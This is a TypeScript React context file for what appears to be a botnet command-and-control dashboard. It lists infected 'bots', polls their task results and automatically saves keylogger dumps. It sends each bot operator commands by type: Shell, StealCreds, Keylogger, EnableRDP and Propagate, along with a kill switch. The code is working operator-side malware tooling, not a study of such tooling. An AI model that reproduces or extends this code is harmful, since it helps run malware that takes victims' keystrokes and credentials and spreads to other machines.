"use client";

import React, {
  createContext,
  useContext,
  useEffect,
  useRef,
  useState,
  useCallback,
} from "react";
import { Socket } from "socket.io-client";
import { toast } from "sonner"; // Import sonner toast
import {
  ClientToServerEvents,
  ServerToClientEvents,
  Bot,
  GlobalDashboardStats,
  LogEntry,
  OSType,
  TaskResult,
} from "@/types/types";

const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080";

type SocketType = Socket<ServerToClientEvents, ClientToServerEvents>;

interface SocketContextTyping {
  socket: SocketType | null;
  isConnected: boolean;
  bots: Bot[];
  globalStats: GlobalDashboardStats;
  logs: LogEntry[];
  taskResults: TaskResult[];
  sendCommand: (botId: string, command: string) => void;
  clearLogs: () => void;
  disconnectAllBots: () => Promise<void>;
}

const SocketContext = createContext<SocketContextTyping | undefined>(undefined);

const mapOSType = (os: string): OSType => {
  const normalized = os.toLowerCase();
  if (normalized.includes("windows")) return "windows";
  if (normalized.includes("linux")) return "linux";
  if (normalized.includes("darwin") || normalized.includes("macos"))
    return "macos";
  if (normalized.includes("android")) return "android";
  if (normalized.includes("ios")) return "ios";
  return "linux"; // Default
};

export const SocketProvider = ({ children }: { children: React.ReactNode }) => {
  const [socket, _setSocket] = useState<SocketType | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [bots, setBots] = useState<Bot[]>([]);
  const [globalStats, setGlobalStats] = useState<GlobalDashboardStats>({
    totalBots: 0,
    onlineBots: 0,
    offlineBots: 0,
    compromisedBots: 0,
    activeSessions: 0,
    networkTrafficIn: 0,
    networkTrafficOut: 0,
  });
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [taskResults, setTaskResults] = useState<TaskResult[]>([]);
  const seenTaskIds = useRef<Set<string>>(new Set());

  // Refs for intervals to clear them on unmount
  const intervals = useRef<ReturnType<typeof setInterval>[]>([]);

  const addLog = useCallback(
    (message: string, level: LogEntry["level"], source: string) => {
      const newLog: LogEntry = {
        id: Date.now().toString() + Math.random().toString(),
        timestamp: new Date().toISOString(),
        level,
        message,
        source,
      };
      setLogs((prev) => [newLog, ...prev].slice(0, 50));
    },
    [],
  );

  // Fetch agents from REST API
  const fetchAgents = useCallback(async () => {
    try {
      const response = await fetch(`${API_URL}/api/agents`);
      if (!response.ok) throw new Error("Failed to fetch agents");

      const data = await response.json();
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const mappedBots: Bot[] = data.map((agent: any) => {
        const lastSeenDate = new Date(agent.last_seen || agent.first_seen);
        const now = new Date();
        const diffSeconds = (now.getTime() - lastSeenDate.getTime()) / 1000;

        // Agent sleeps for 30-90s. Consider offline if no poll for > 120s.
        const isOnline = diffSeconds < 120;

        return {
          id: agent.agent_id,
          hostname: agent.hostname,
          ip: agent.ip,
          os: mapOSType(agent.os),
          status: isOnline ? "online" : "offline",
          lastSeen: agent.last_seen || agent.first_seen,
          location: agent.location || "Unknown",
          coordinates: agent.coordinates || null,
          user: agent.username,
          tags: ["active"],
          stats: {
            cpuUsage: agent.stats?.cpu_usage || 0,
            memoryUsage: agent.stats?.memory_usage || 0,
            uptime: agent.stats?.uptime || 0,
            activeConnections: 1,
          },
        };
      });

      const onlineBotsCount = mappedBots.filter(
        (b) => b.status === "online",
      ).length;
      const offlineBotsCount = mappedBots.length - onlineBotsCount;

      setBots((prev) => {
        const isSame = JSON.stringify(prev) === JSON.stringify(mappedBots);
        return isSame ? prev : mappedBots;
      });
      setIsConnected(true);

      // Update global stats based on real data
      setGlobalStats((prev: GlobalDashboardStats) => ({
        ...prev,
        totalBots: mappedBots.length,
        onlineBots: onlineBotsCount,
        offlineBots: offlineBotsCount,
        // If we want to show "active" sessions, we could count how many bots were active recently
        activeSessions: onlineBotsCount,
        // Backend doesn't provide real-time traffic stats per agent yet,
        // but we'll add subtle mock values if online bots > 0 to make it "useful" visually
        networkTrafficIn: onlineBotsCount > 0 ? Math.random() * 2 + 0.1 : 0,
        networkTrafficOut: onlineBotsCount > 0 ? Math.random() * 1 + 0.05 : 0,
      }));
    } catch (error) {
      console.error("Polling error:", error);
      setIsConnected(false);
    }
  }, []);

  // Fetch results from REST API
  const fetchResults = useCallback(async () => {
    try {
      const response = await fetch(`${API_URL}/api/results`);
      if (!response.ok) throw new Error("Failed to fetch results");

      const results: TaskResult[] = await response.json();

      // Filter for new results
      const newResults = results.filter(
        (r) => !seenTaskIds.current.has(r.task_id),
      );

      if (newResults.length > 0) {
        newResults.forEach((r) => {
          seenTaskIds.current.add(r.task_id);
          const level = r.success ? "success" : "error";
          const bot = bots.find((b) => b.id === r.agent_id);
          const source = bot ? bot.hostname : r.agent_id;

          addLog(
            `Task completed: ${r.output.split("\n")[0]}...`,
            level,
            source,
          );

          if (r.output.includes("=== KEYLOGGER DUMP ===")) {
            try {
              // Auto-download Keylogs
              const blob = new Blob([r.output], { type: "text/plain" });
              const url = window.URL.createObjectURL(blob);
              const a = document.createElement("a");
              a.href = url;
              a.download = `keylog_${r.agent_id}_${new Date().getTime()}.txt`;
              document.body.appendChild(a);
              a.click();
              document.body.removeChild(a);
              window.URL.revokeObjectURL(url);
              toast.success("Keylog downloaded automatically");
            } catch (e) {
              console.error("Download failed", e);
            }
          }

          if (!r.success) {
            toast.error(`Task Failed on ${source}`, { description: r.output });
          }
        });

        setTaskResults((prev) => [...prev, ...newResults]);
      }
    } catch (error) {
      console.error("Results polling error:", error);
    }
  }, [bots, addLog]);

  // Initialize Polling
  useEffect(() => {
    // START REAL POLLING
    fetchAgents();
    fetchResults();
    const pollingInterval = setInterval(fetchAgents, 5000);
    const resultsInterval = setInterval(fetchResults, 2000);
    intervals.current.push(pollingInterval, resultsInterval);

    const currentIntervals = intervals.current;

    return () => {
      currentIntervals.forEach(clearInterval);
    };
  }, [fetchAgents, fetchResults]);

  const sendCommand = useCallback(
    async (botId: string, command: string) => {
      try {
        // C2 Server expects CommandType enum
        // For shell commands, we wrap it in the expected JSON structure
        let payload;
        if (command === "terminate") {
          payload = { type: "Terminate" };
        } else if (command === "reboot") {
          payload = { type: "Reboot" };
        } else if (command.startsWith("keylogger ")) {
          const action = command.split(" ")[1];
          payload = { type: "Keylogger", action };
        } else if (command === "info") {
          payload = { type: "SystemInfo" };
        } else if (command === "rdp" || command === "enable-rdp") {
          payload = { type: "EnableRDP" };
        } else if (command === "disable-rdp") {
          payload = { type: "DisableRDP" };
        } else if (
          command === "cred" ||
          command === "steal-creds" ||
          command === "browser-creds"
        ) {
          payload = { type: "StealCreds" };
        } else if (command === "propagate" || command.startsWith("propagate ")) {
          const targets = command.slice("propagate".length).trim();
          payload = { type: "Propagate", targets: targets ? [targets] : [] };
        } else {
          payload = {
            type: "Shell",
            data: { command },
          };
        }

        const response = await fetch(`${API_URL}/api/command/${botId}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });

        if (!response.ok) throw new Error("Failed to issue command");

        const result = await response.json();
        addLog(
          `Command queued for ${botId} (Task ID: ${result.task_id})`,
          "info",
          "C2 Server",
        );
        toast.success("Command queued successfully");
      } catch (error) {
        console.error("Command error:", error);
        toast.error("Failed to send command");
      }
    },
    [addLog],
  );

  const clearLogs = useCallback(() => {
    setLogs([]);
    toast.info("Logs cleared");
  }, []);

  const disconnectAllBots = useCallback(async () => {
    try {
      const response = await fetch(`${API_URL}/api/emergency/killswitch`, {
        method: "POST",
      });

      if (!response.ok) throw new Error("Kill switch failed");

      setBots((prev) => prev.map((b) => ({ ...b, status: "offline" })));
      addLog(
        "KILL SWITCH ACTIVATED - All bots terminated",
        "warning",
        "System",
      );
      toast.warning("System Purged: All agents terminated");
    } catch (error) {
      console.error("Kill switch error:", error);
      toast.error("Kill switch failed to execute on server");
    }
  }, [addLog]);

  return (
    <SocketContext.Provider
      value={{
        socket,
        isConnected,
        bots,
        globalStats,
        logs,
        taskResults,
        sendCommand,
        clearLogs,
        disconnectAllBots,
      }}
    >
      {children}
    </SocketContext.Provider>
  );
};

export const useSocketContext = () => {
  const context = useContext(SocketContext);
  if (context === undefined) {
    throw new Error("useSocketContext must be used within a SocketProvider");
  }
  return context;
};
